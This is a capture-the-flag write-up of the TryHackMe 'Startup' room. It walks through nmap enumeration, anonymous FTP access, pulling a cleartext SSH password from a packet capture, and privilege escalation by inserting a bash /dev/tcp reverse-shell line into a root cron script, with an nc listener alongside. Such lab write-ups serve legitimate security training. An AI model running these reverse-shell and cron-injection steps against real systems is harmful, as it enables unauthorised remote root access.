Startup CTF — TryHackMe Writeup  
Overview
This room demonstrates a full penetration testing workflow including:
- Enumeration 
- Exploitation 
- Privilege Escalation 
The goal was to gain root access on the target machine.



1. Enumeration

Nmap Scan

```
nmap -sC -sV -p- <target-ip>
```

Findings:

- 21/tcp → FTP (anonymous login allowed)
- 22/tcp → SSH
- 80/tcp → HTTP
---

Reasoning

The presence of:
- Anonymous FTP access 
- Writable directory 
Indicates weak access control
This makes FTP a strong initial attack vector.





---

2. FTP Exploitation


Accessing FTP

```
ftp <target-ip>

```
Login:
```
username: anonymous
password: anonymous

```

Files Found:

- important.jpg
- notice.txt
---

 Reasoning

- Publicly accessible files may contain:
	- Sensitive information
	- Hidden data
- Writable FTP suggests potential for file upload attacks
---

---

3. Web Exploitation

- FTP directory was accessible via web server
---

🧠 Vulnerability

👉 File Upload Vulnerability
Since:
- FTP is writable
- Web server serves same directory
→ Attacker can upload malicious file and execute it
---



4. Initial Access (Reverse Shell)


🛠️ Listener (Attacker Machine)

```
nc -lvnp 4444

```

---



---

🧠 Explanation

This establishes a:👉 Reverse Shell
Where:
- Target connects back to attacker
- Attacker gains interactive shell access
---

5.Analyzing Suspicious Files on the Server


While exploring the FTP directory, I found a file named suspicious.pcapng. To investigate further, I copied this file to the web-accessible directory so I could download and analyze it:


```
cp suspicious.pcapng /var/www/html/files/ftp
```

Once the file was successfully copied, I accessed http://<target-ip>/files/ftp/suspicious.pcapng to download it to my local machine.

Using Wireshark, I opened the pcapng file to analyze the network traffic. This helped uncover valuable information hidden inside the capture.


6.Extracting Credentials from the Network Capture

After opening the suspicious.pcapng file in Wireshark, I focused on the TCP streams to find any sensitive information.
Right-clicking on a TCP packet and selecting “Follow” → “TCP Stream” allowed me to view the entire communication.


By cycling through the stream numbers, I found on Stream 7 some cleartext credentials:
- Username: lennie
- Password: c4ntg3t3n0ughsp1c3

These credentials would be very useful for the next stage: gaining SSH access.

7.Gaining SSH Access with Extracted Credentials


Using the username and password found in the network capture, I attempted to log in via SSH:
```
ssh lennie@<target-ip>
```

After entering the password c4ntg3t3n0ughsp1c3, I successfully gained SSH access to the target machine as the user lennie.
Press enter or click to view image in full size


 6. Privilege Escalation


Now that I had user access, the next step was to escalate privileges to obtain root access.

I started by checking sudo privileges:


 Discovery

Found scripts:
```
/home/lennie/scripts/planner.sh
/etc/print.sh

```

---

Execution Flow

```
cron (root)
 → planner.sh
 → /etc/print.sh

```

---

Vulnerability

 Insecure Script Permissions
- /etc/print.sh is writable
- Executed by a root process
This allows: Command Injection → Privilege Escalation
---

 Exploitation


Modify script:

```
nano /etc/print.sh

```


Insert:
```
bash -i >& /dev/tcp/<your-ip>/4444 0>&1

```

---

Explanation

When the script runs:
The above command is reverse shell 
bash -i 
-> Starts an interactive bash shell
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
-> Treat a network connection like a file and connect to this IP address and port 
>&
-> Redirects outputs (Sends everything to my machine)

0>&1

 Redirects input
- It executes attacker payload
- Gives root shell
---

7. Root Access

```
whoami

```
Output:
```
root

```

---

🛠️ Retrieve Flag

```
cat /root/root.txt

```



---

🧠 Key Learnings

- Importance of proper enumeration
- Risks of anonymous FTP access
- Hidden data in files (steganography)
- File upload → Remote Code Execution
- Privilege escalation via writable scripts
- Understanding execution chains (cron jobs)

---




